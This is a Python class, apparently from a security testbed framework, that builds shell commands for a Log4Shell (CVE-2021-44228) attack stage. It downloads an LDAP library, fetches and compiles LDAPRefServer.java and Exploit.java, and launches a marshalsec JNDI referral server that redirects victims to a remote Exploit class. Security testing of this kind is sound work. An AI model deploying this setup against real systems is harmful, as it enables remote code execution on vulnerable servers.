import os, sys, logging
import pathlib
fpath = pathlib.Path(__file__).parent.resolve()
root_directory = os.path.abspath("{}/..".format(fpath))
from applications.application import Application

class Cve202144228LdapServer(Application):
    def __init__(self, app, **params):
        name = params.get("name", app)
        if "name" in params:
            del params["name"]
        super().__init__(app, name, **params)

    # Please revise the following functions if it is different
    # from the default way
    def check_application(self, arch=None, os=None):
        logging.debug("Check the application: {}".format(self.app))
        cmds = []

        cmd = "must"
        cmds.append(cmd)
        # if arch == "aarch64" and os == "debian":
        #     cmd = "which nmap"
        #     cmds.append(cmd)
        return cmds

    def prepare_application(self, arch=None, os=None):
        logging.debug("Prepare the application: {}".format(self.app))
        cmds = []
        cmd = "cd ~"
        cmds.append(cmd)

        cmd = "wget https://repo1.maven.org/maven2/com/unboundid/unboundid-ldapsdk/6.0.7/unboundid-ldapsdk-6.0.7.jar -O unboundid-ldapsdk.jar"
        cmds.append(cmd)

        cmd = "mkdir -p marshalsec/jndi"
        cmds.append(cmd)

        cmd = "wget http://cache-address:cache-port/{}/LDAPRefServer.java".format(self.app)
        cmds.append(cmd)

        cmd = "cp LDAPRefServer.java marshalsec/jndi/LDAPRefServer.java"
        cmds.append(cmd)

        cmd = "wget http://cache-address:cache-port/{}/Exploit.java".format(self.app)
        cmds.append(cmd)

        cmd = "javac -cp unboundid-ldapsdk.jar marshalsec/jndi/LDAPRefServer.java Exploit.java"
        cmds.append(cmd)

        # if arch == "aarch64" and os == "debian":
        #     cmd = "apt-get install nmap"
        #     cmds.append(cmd)
        return cmds

    def run_application(self, arch=None, os=None, **params):
        logging.debug("Run the application: {}".format(self.app))
        
        names = params.get("names", None)
        target = params.get("target", "http_server")
        if names:
            if target in names:
                target = names[target]
        port = params.get("port", 8001)

        cmds = []

        if target and port:
            cmd = "java -cp \".:unboundid-ldapsdk.jar\" marshalsec.jndi.LDAPRefServer http://{}:{}/#Exploit 1389 &".format(target, port)
            cmds.append(cmd)

        # if arch == "aarch64" and os == "debian":
        #     cmd = "nmap"
        #     cmds.append(cmd)
        return cmds
